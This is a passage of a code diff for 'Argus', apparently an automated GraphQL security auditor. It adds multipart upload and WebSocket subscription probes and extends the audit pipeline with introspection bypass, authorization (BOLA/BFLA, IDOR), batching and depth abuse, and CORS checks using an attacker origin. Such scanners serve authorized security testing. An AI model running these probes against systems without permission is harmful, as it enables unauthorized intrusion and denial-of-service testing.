-        acac = resp.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
+    r = session.request(
+        "OPTIONS", ep.url,
+        headers={"Origin": attacker_origin, "Access-Control-Request-Method": "POST"},
+    )
+    if r:
+        acao = r.headers.get("Access-Control-Allow-Origin", "")
+        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower() == "true"
         if attacker_origin in acao and acac:
+            ep.cors_reflects_creds = True
             findings.append(GraphQLFinding(
-                target=endpoint.url,
-                vuln_type="graphql_cors_credentialed",
-                severity="HIGH",
-                confidence=90,
+                endpoint=ep.url, vuln_type="graphql_cors_credentialed",
+                category="transport", severity="HIGH", confidence=90,
+                engine=ep.engine,
                 evidence="CORS reflects attacker origin with credentials",
                 details={"acao": acao, "acac": True},
+                auth_enabled=auth_on, first_seen=now,
             ))
-    except requests.RequestException:
-        pass
 
     return findings
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  PHASE 9 — MULTIPART UPLOAD
+# ═════════════════════════════════════════════════════════════════════════════
+
+MULTIPART_BOUNDARY = "----ArgusGraphQLBoundary"
+
+
+def _build_multipart_body(query: str) -> bytes:
+    body = (
+        f"--{MULTIPART_BOUNDARY}\r\n"
+        'Content-Disposition: form-data; name="operations"\r\n\r\n'
+        f'{{"query":"{query}"}}\r\n'
+        f"--{MULTIPART_BOUNDARY}\r\n"
+        'Content-Disposition: form-data; name="map"\r\n\r\n'
+        '{"0":["variables.file"]}\r\n'
+        f"--{MULTIPART_BOUNDARY}\r\n"
+        'Content-Disposition: form-data; name="0"; filename="argus.txt"\r\n'
+        'Content-Type: text/plain\r\n\r\n'
+        "argus-test-file\r\n"
+        f"--{MULTIPART_BOUNDARY}--\r\n"
+    )
+    return body.encode()
+
+
+def test_multipart_upload(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
+) -> list[GraphQLFinding]:
+    """
+    Detect graphql-upload multipart surface. If the endpoint accepts the
+    multipart spec, the upload path is a separate attack surface.
+    """
+    findings: list[GraphQLFinding] = []
+    now = datetime.now(timezone.utc).isoformat()
+
+    # Test with a query that references variables.file
+    query = "mutation($file: Upload!) { __typename }"
+    body = _build_multipart_body(query)
+
+    r = session.post_raw(
+        ep.url, body,
+        f"multipart/form-data; boundary={MULTIPART_BOUNDARY}",
+    )
+    if r and r.status_code < 500:
+        try:
+            data = r.json()
+            # Even a "no Upload type" error means the parser handled the multipart request
+            errs = " ".join(_errors(r)).lower()
+            if "upload" in errs or _is_graphql_response(r):
+                ep.multipart_supported = True
+                findings.append(GraphQLFinding(
+                    endpoint=ep.url, vuln_type="graphql_multipart_upload_surface",
+                    category="upload", severity="MEDIUM", confidence=55,
+                    engine=ep.engine,
+                    evidence="Endpoint accepts multipart GraphQL upload requests",
+                    query_payload=query,
+                    response_snippet=_body_text(r, 300),
+                    details={
+                        "test_file": "argus-test-file",
+                        "note": "Test file-upload bypasses: path traversal in filename, content-type trust, size limits",
+                    },
+                    auth_enabled=auth_on, first_seen=now,
+                ))
+        except Exception:
+            pass
+
+    return findings
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  PHASE 10 — WEBSOCKET SUBSCRIPTIONS
+# ═════════════════════════════════════════════════════════════════════════════
+
+def test_websocket_subscriptions(
+    session: RateLimitedSession, ep: GraphQLEndpoint, auth_on: bool,
+) -> list[GraphQLFinding]:
+    """
+    Detect exposed WebSocket subscription endpoint. Confirmation requires
+    an actual WS handshake, which this module doesn't attempt — we surface
+    the surface for manual testing with wscat.
+    """
+    findings: list[GraphQLFinding] = []
+    if not ep.schema:
+        return findings
+    sub_type = ep.schema.get("subscriptionType")
+    if not sub_type:
+        return findings
+    now = datetime.now(timezone.utc).isoformat()
+
+    findings.append(GraphQLFinding(
+        endpoint=ep.websocket_url or ep.url,
+        vuln_type="graphql_websocket_subscription_surface",
+        category="subscription", severity="MEDIUM", confidence=50,
+        engine=ep.engine,
+        evidence=f"Schema exposes subscription type '{sub_type.get('name')}' — test WS auth manually",
+        details={
+            "subscription_type": sub_type.get("name"),
+            "ws_url": ep.websocket_url or _discover_ws_url(ep.url),
+            "test_command": f"wscat -c {ep.websocket_url or _discover_ws_url(ep.url)}",
+        },
+        auth_enabled=auth_on, first_seen=now,
+    ))
+
+    return findings
+
+
+# ═════════════════════════════════════════════════════════════════════════════
+#  SELF-SYNC
+# ═════════════════════════════════════════════════════════════════════════════
+
+def _self_sync(scan_id: int, findings: list[GraphQLFinding]) -> None:
+    if not findings:
+        return
+    if not DB_AVAILABLE or DB is None:
+        log.warning("  DB sync: db.py not available")
+        return
+    if not _cfg("SYNC_TO_DB", True):
+        log.info("  DB sync: SYNC_TO_DB is False")
+        return
+    if not _cfg("BRIDGE_ENABLED", False):
+        log.info("  DB sync: BRIDGE_ENABLED is False")
+        return
+    if not DB.available:
+        log.warning("  DB sync: bridge client not ready")
+        return
+
+    try:
+        payloads = [f.to_dict() for f in findings]
+        result = DB.upsert_graphql_findings(scan_id, payloads)
+        if result is None:
+            log.warning("  DB sync: bridge returned None")
+        else:
+            log.info(f"  DB sync: {result} GraphQL finding(s) upserted (scan_id={scan_id})")
+    except Exception as e:
+        log.warning(f"  DB sync: exception — {e}")
 
 
 # ═════════════════════════════════════════════════════════════════════════════
@@ -970,48 +1466,64 @@ def run_graphql_audit(
     live_urls_file: Path,
     outdir: Path,
     *,
+    rate_limit: Optional[int] = None,
+    concurrency: Optional[int] = None,
+    headers: Optional[dict] = None,
     user_a_cookie: Optional[str] = None,
     user_b_cookie: Optional[str] = None,
     user_b_id: Optional[str] = None,
     test_authz: bool = True,
-    test_query_abuse: bool = True,
     test_injection: bool = True,
-    test_csrf_cors: bool = True,
-    threads: int = DEFAULT_THREADS,
+    test_query_abuse: bool = True,
+    test_csrf: bool = True,
+    test_upload: bool = True,
+    test_subscriptions: bool = True,
+    scan_id: Optional[int] = None,
 ) -> Path:
-    """
-    Run the full GraphQL audit against every URL in `live_urls_file`.
-
-    Returns the path to `graphql_findings.json`.
-    """
     start = time.monotonic()
+
+    settings = _gql_settings()
+    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
+    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
+    eff_timeout = settings["timeout"]
 
     base_urls = _load_urls(live_urls_file)
     outdir.mkdir(parents=True, exist_ok=True)
 
+    auth_on = bool(_cfg("AUTH_ENABLED", False))
+    cfg_hdrs = _target_headers()
+    if headers:
+        for k, v in headers.items():
+            cfg_hdrs.setdefault(k, v)
+
     log.info(f"  Input  : {len(base_urls)} URL(s) from {live_urls_file.name}")
+    log.info(f"  Config : rate_limit={eff_rate}/s  concurrency={eff_conc}  timeout={eff_timeout}s")
+    log.info(f"           source: MODULE_RATE_LIMITS['graphql']")
+
+    if cfg_hdrs:
+        log.info(f"  Headers: {len(cfg_hdrs)} configured, applied to every request")
+        for k, v in list(cfg_hdrs.items())[:3]:
+            log.info(f"           · {k}: {v[:40]}{'…' if len(v) > 40 else ''}")
     if user_a_cookie:
-        log.info("  Auth A : User A cookie supplied (BOLA/BFLA testing enabled)")
-    if user_b_cookie:
-        log.info("  Auth B : User B cookie supplied")
+        log.info("  Auth A : supplied (BOLA/BFLA testing enabled)")
+    elif auth_on:
+        log.info("  Auth   : request.txt session (BOLA/BFLA limited)")
+    else:
+        log.info("  Auth   : disabled")
     log.info("")
 
     if not base_urls:
-        log.warning("  No URLs to audit — writing empty report")
+        log.warning("  No URLs — writing empty report")
         return _write_empty_report(outdir, live_urls_file, start)
 
-    session = requests.Session()
-    session.headers.update({"User-Agent": USER_AGENT})
-    session.verify = False
+    session = RateLimitedSession(rate_limit=eff_rate, timeout=eff_timeout)
 
-    # ── Phase 1: Discovery ──────────────────────────────────────────────────
+    # ── Phase 1 ─────────────────────────────────────────────────────────────
     log.info("  Phase 1 — GraphQL endpoint discovery")
     endpoints = discover_graphql_endpoints(session, base_urls)
-
     if not endpoints:
         log.warning("  No GraphQL endpoints discovered — writing empty report")
-        return _write_empty_report(outdir, live_urls_file, start, total_input=len(base_urls))
-
+        return _write_empty_report(outdir, live_urls_file, start, len(base_urls))
     log.info(f"    Discovered {len(endpoints)} endpoint(s)")
     log.info("")
 
@@ -1021,106 +1533,129 @@ def run_graphql_audit(
     for ep in endpoints:
         log.info(f"  Auditing {ep.url}")
 
-        # ── Phase 2: Fingerprint ────────────────────────────────────────────
+        # ── Phase 2 ─────────────────────────────────────────────────────────
         ep.engine = fingerprint_engine(session, ep)
         log.info(f"    Engine   : {ep.engine}")
 
-        # ── Phase 3: Introspection ──────────────────────────────────────────
+        # ── Phase 3 ─────────────────────────────────────────────────────────
         schema = run_introspection(session, ep)
         if schema:
             schema_dumps[ep.url] = schema
             log.info("    Schema   : introspectable")
-            schema_findings = analyze_schema(ep, schema)
+            schema_findings = analyze_schema(ep, schema, auth_on)
             all_findings.extend(schema_findings)
             log.info(f"    Schema findings: {len(schema_findings)}")
         else:
             log.info("    Schema   : not introspectable")
+            bypass_findings = bypass_introspection(session, ep, auth_on)
+            all_findings.extend(bypass_findings)
+            log.info(f"    Introspection bypass findings: {len(bypass_findings)}")
 
-        # ── Phase 4: Authorization ──────────────────────────────────────────
+        # ── Phase 5 ─────────────────────────────────────────────────────────
         if test_authz:
-            bola = test_bola(session, ep, user_a_cookie, user_b_id)
-            bfla = test_bfla(session, ep, user_a_cookie)
-            all_findings.extend(bola + bfla)
-            log.info(f"    Authz findings: {len(bola) + len(bfla)}")
+            bola = test_bola(session, ep, user_a_cookie, user_b_id, auth_on)
+            bfla = test_bfla(session, ep, user_a_cookie, auth_on)
+            relay = test_relay_node_idor(session, ep, auth_on)
+            nested = test_nested_object_authz(session, ep, auth_on)
+            all_findings.extend(bola + bfla + relay + nested)
+            log.info(f"    Authz findings: {len(bola) + len(bfla) + len(relay) + len(nested)}")
 
-        # ── Phase 5: Query abuse ────────────────────────────────────────────
-        if test_query_abuse:
-            batch = test_batching(session, ep)
-            depth = test_depth(session, ep)
-            all_findings.extend(batch + depth)
-            log.info(f"    Query abuse findings: {len(batch) + len(depth)}")
-
-        # ── Phase 6: Injection surface ──────────────────────────────────────
+        # ── Phase 6 ─────────────────────────────────────────────────────────
         if test_injection:
-            inj = test_injection_surface(session, ep)
+            inj = test_injection(session, ep, auth_on)
             all_findings.extend(inj)
-            log.info(f"    Injection/leak findings: {len(inj)}")
+            log.info(f"    Injection findings: {len(inj)}")
 
-        # ── Phase 7: CSRF/CORS ──────────────────────────────────────────────
-        if test_csrf_cors:
-            csrf = test_csrf_cors(session, ep)
+        # ── Phase 7 ─────────────────────────────────────────────────────────
+        if test_query_abuse:
+            batch = test_batching(session, ep, auth_on)
+            depth = test_depth(session, ep, auth_on)
+            neg = test_negative_limit(session, ep, auth_on)
+            flood = test_directive_flood(session, ep, auth_on)
+            all_findings.extend(batch + depth + neg + flood)
+            log.info(f"    Query-abuse findings: {len(batch) + len(depth) + len(neg) + len(flood)}")
+
+        # ── Phase 8 ─────────────────────────────────────────────────────────
+        if test_csrf:
+            csrf = test_csrf_cors(session, ep, auth_on)
             all_findings.extend(csrf)
             log.info(f"    CSRF/CORS findings: {len(csrf)}")
 
+        # ── Phase 9 ─────────────────────────────────────────────────────────
+        if test_upload:
+            up = test_multipart_upload(session, ep, auth_on)
+            all_findings.extend(up)
+            log.info(f"    Upload findings: {len(up)}")
+
+        # ── Phase 10 ────────────────────────────────────────────────────────
+        if test_subscriptions:
+            sub = test_websocket_subscriptions(session, ep, auth_on)
+            all_findings.extend(sub)
+            log.info(f"    Subscription findings: {len(sub)}")
+
         log.info("")
 
-    # ── Deduplicate ──────────────────────────────────────────────────────────
+    # ── Dedupe + sort ───────────────────────────────────────────────────────
     seen: set[tuple] = set()
     deduped: list[GraphQLFinding] = []
     for f in all_findings:
-        key = (f.target, f.vuln_type)
+        key = (f.endpoint, f.vuln_type)
         if key not in seen:
             seen.add(key)
             deduped.append(f)
 
-    # ── Sort ────────────────────────────────────────────────────────────────
-    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
-    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))
+    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
+    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.endpoint))
 
-    # ── Write outputs ────────────────────────────────────────────────────────
+    # ── Report ──────────────────────────────────────────────────────────────
     elapsed = time.monotonic() - start
-    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
+    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
+    by_category: dict[str, int] = {}
     by_type: dict[str, int] = {}
 
     for f in deduped:
         by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
+        by_category[f.category] = by_category.get(f.category, 0) + 1
         by_type[f.vuln_type] = by_type.get(f.vuln_type, 0) + 1
 
-    # Flat candidates
-    candidate_lines = [
-        f"{f.target}\t{f.vuln_type}\t{f.severity}\t{f.confidence}\t{f.evidence[:160]}"
-        for f in deduped
-    ]
-    (outdir / "graphql_candidates.txt").write_text("\n".join(candidate_lines) + "\n")
-
-    # BOLA-specific flat file
-    bola_findings = [f for f in deduped if "bola" in f.vuln_type]
+    # Flat outputs
+    (outdir / "graphql_candidates.txt").write_text(
+        "\n".join(
+            f"{f.endpoint}\t{f.vuln_type}\t{f.category}\t{f.severity}\t{f.confidence}\t{f.evidence[:160]}"
+            for f in deduped
+        ) + ("\n" if deduped else "")
+    )
     (outdir / "graphql_bola.txt").write_text(
-        "\n".join(f"{f.target}\t{f.evidence}" for f in bola_findings) + "\n"
+        "\n".join(f"{f.endpoint}\t{f.evidence[:160]}" for f in deduped if "bola" in f.vuln_type or "bfla" in f.vuln_type) + "\n"
     )
-
-    # Query abuse flat file
-    abuse_findings = [f for f in deduped if "batching" in f.vuln_type or "depth" in f.vuln_type]
     (outdir / "graphql_query_abuse.txt").write_text(
-        "\n".join(f"{f.target}\t{f.vuln_type}\t{f.evidence}" for f in abuse_findings) + "\n"
+        "\n".join(f"{f.endpoint}\t{f.vuln_type}\t{f.evidence[:160]}" for f in deduped if f.category == "dos") + "\n"
+    )
+    (outdir / "graphql_injection.txt").write_text(
+        "\n".join(f"{f.endpoint}\t{f.vuln_type}\t{f.evidence[:160]}" for f in deduped if f.category == "injection") + "\n"
     )
 
-    # Schema dumps
     if schema_dumps:
-        schema_path = outdir / "graphql_schema.json"
-        schema_path.write_text(json.dumps(schema_dumps, indent=2) + "\n")
+        (outdir / "graphql_schema.json").write_text(json.dumps(schema_dumps, indent=2) + "\n")
 
-    # JSON report
     report = {
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "elapsed_seconds": round(elapsed, 2),
         "input_file": str(live_urls_file),
+        "auth_enabled": auth_on,
         "config": {
-            "test_authz":       test_authz,
-            "test_query_abuse": test_query_abuse,
-            "test_injection":   test_injection,
-            "test_csrf_cors":   test_csrf_cors,
-            "authenticated":    user_a_cookie is not None,
+            "rate_limit":          eff_rate,
+            "concurrency":         eff_conc,
+            "timeout":             eff_timeout,
+            "headers_count":       len(cfg_hdrs),
+            "user_a_cookie_set":   user_a_cookie is not None,
+            "user_b_id_set":       user_b_id is not None,
+            "test_authz":          test_authz,
+            "test_injection":      test_injection,
+            "test_query_abuse":    test_query_abuse,
+            "test_csrf":           test_csrf,
+            "test_upload":         test_upload,
+            "test_subscriptions":  test_subscriptions,
         },
         "endpoints": [ep.to_dict() for ep in endpoints],
         "totals": {
@@ -1135,6 +1670,7 @@ def run_graphql_audit(
         },
         "summary": {
             "by_severity": by_severity,
+            "by_category": dict(sorted(by_category.items(), key=lambda kv: -kv[1])),
             "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
         },
         "findings": [f.to_dict() for f in deduped],
@@ -1143,12 +1679,23 @@ def run_graphql_audit(
     json_path = outdir / "graphql_findings.json"
     json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
 
+    # ── Self-sync ───────────────────────────────────────────────────────────
+    if scan_id is not None:
+        log.info("")
+        log.info(f"  Syncing to remote database (scan_id={scan_id})...")
+        _self_sync(scan_id, deduped)
+    else:
+        log.info("")
+        log.info("  DB sync  : deferred to main.py (no scan_id passed)")
+
     # ── Console summary ─────────────────────────────────────────────────────
+    log.info("")
     log.info("  Outputs :")
     log.info(f"    {json_path.name:<30} {len(deduped):>5} finding(s)")
     log.info(f"    graphql_candidates.txt          {len(deduped):>5} candidate(s)")
-    log.info(f"    graphql_bola.txt                {len(bola_findings):>5} BOLA finding(s)")
-    log.info(f"    graphql_query_abuse.txt         {len(abuse_findings):>5} abuse finding(s)")
+    log.info(f"    graphql_bola.txt                {sum(1 for f in deduped if 'bola' in f.vuln_type or 'bfla' in f.vuln_type):>5} BOLA/BFLA finding(s)")
+    log.info(f"    graphql_query_abuse.txt         {sum(1 for f in deduped if f.category == 'dos'):>5} DoS finding(s)")
+    log.info(f"    graphql_injection.txt           {sum(1 for f in deduped if f.category == 'injection'):>5} injection finding(s)")
     if schema_dumps:
         log.info(f"    graphql_schema.json             {len(schema_dumps):>5} schema(s)")
 
@@ -1160,12 +1707,16 @@ def run_graphql_audit(
         f"MEDIUM={by_severity['MEDIUM']}  "
         f"LOW={by_severity['LOW']}"
     )
+    if by_category:
+        log.info("  Category : " + " · ".join(
+            f"{k}({v})" for k, v in list(by_category.items())[:8]
+        ))
 
     if deduped:
         log.info("")
         log.info("  Top findings:")
         for f in deduped[:12]:
-            log.info(f"    [{f.severity:<8}] {f.vuln_type:<32} {f.target[:55]}")
+            log.info(f"    [{f.severity:<8}] {f.category:<14} {f.vuln_type:<38} {f.endpoint[:50]}")
 
     log.info("")
     log.info(f"  Completed in {elapsed:.1f}s")
@@ -1179,6 +1730,7 @@ def _write_empty_report(
         "generated_at": datetime.now(timezone.utc).isoformat(),
         "elapsed_seconds": round(time.monotonic() - start, 2),
         "input_file": str(input_file),
+        "auth_enabled": bool(_cfg("AUTH_ENABLED", False)),
         "config": {},
         "endpoints": [],
         "totals": {
@@ -1186,13 +1738,13 @@ def _write_empty_report(
             "introspectable": 0, "total_findings": 0,
             "critical": 0, "high": 0, "medium": 0, "low": 0,
         },
-        "summary": {"by_severity": {}, "by_type": {}},
+        "summary": {"by_severity": {}, "by_category": {}, "by_type": {}},
         "findings": [],
     }
     path = outdir / "graphql_findings.json"
     path.write_text(json.dumps(report, indent=2) + "\n")
     for name in ("graphql_candidates.txt", "graphql_bola.txt",
-                 "graphql_query_abuse.txt"):
+                 "graphql_query_abuse.txt", "graphql_injection.txt"):
         (outdir / name).write_text("")
     return path
 
@@ -1208,31 +1760,43 @@ if __name__ == "__main__":
         handlers=[logging.StreamHandler(sys.stdout)],
     )
     base = Path(__file__).resolve().parent.parent
-    live = base / "output" / "live_urls.txt"
+    default_input = base / "output" / "urls_with_params.txt"
+    if not default_input.exists():
+        default_input = base / "output" / "live_urls.txt"
     out = base / "output"
 
     parser = argparse.ArgumentParser(description="Argus GraphQL Auditor (standalone)")
-    parser.add_argument("--input", type=Path, default=live, help="Input URL file")
-    parser.add_argument("--output", type=Path, default=out, help="Output directory")
+    parser.add_argument("--input", type=Path, default=default_input)
+    parser.add_argument("--output", type=Path, default=out)
+    parser.add_argument("--scan-id", type=int, default=None)
+    parser.add_argument("--rate-limit", type=int, default=None)
+    parser.add_argument("--concurrency", type=int, default=None)
     parser.add_argument("--cookie-a", help="User A session cookie for BOLA/BFLA")
     parser.add_argument("--cookie-b", help="User B session cookie")
     parser.add_argument("--user-b-id", help="User B's object identifier")
-    parser.add_argument("--no-authz", action="store_true", help="Skip authz tests")
-    parser.add_argument("--no-abuse", action="store_true", help="Skip query abuse")
-    parser.add_argument("--no-injection", action="store_true", help="Skip injection")
-    parser.add_argument("--no-csrf", action="store_true", help="Skip CSRF/CORS")
+    parser.add_argument("--no-authz", action="store_true")
+    parser.add_argument("--no-injection", action="store_true")
+    parser.add_argument("--no-abuse", action="store_true")
+    parser.add_argument("--no-csrf", action="store_true")
+    parser.add_argument("--no-upload", action="store_true")
+    parser.add_argument("--no-subscriptions", action="store_true")
     args = parser.parse_args()
 
     try:
         run_graphql_audit(
             args.input, args.output,
+            rate_limit=args.rate_limit,
+            concurrency=args.concurrency,
             user_a_cookie=args.cookie_a,
             user_b_cookie=args.cookie_b,
             user_b_id=args.user_b_id,
             test_authz=not args.no_authz,
-            test_query_abuse=not args.no_abuse,
             test_injection=not args.no_injection,
-            test_csrf_cors=not args.no_csrf,
+            test_query_abuse=not args.no_abuse,
+            test_csrf=not args.no_csrf,
+            test_upload=not args.no_upload,
+            test_subscriptions=not args.no_subscriptions,
+            scan_id=args.scan_id,
         )
     except Exception as e:
         log.error(f"failed: {e}")
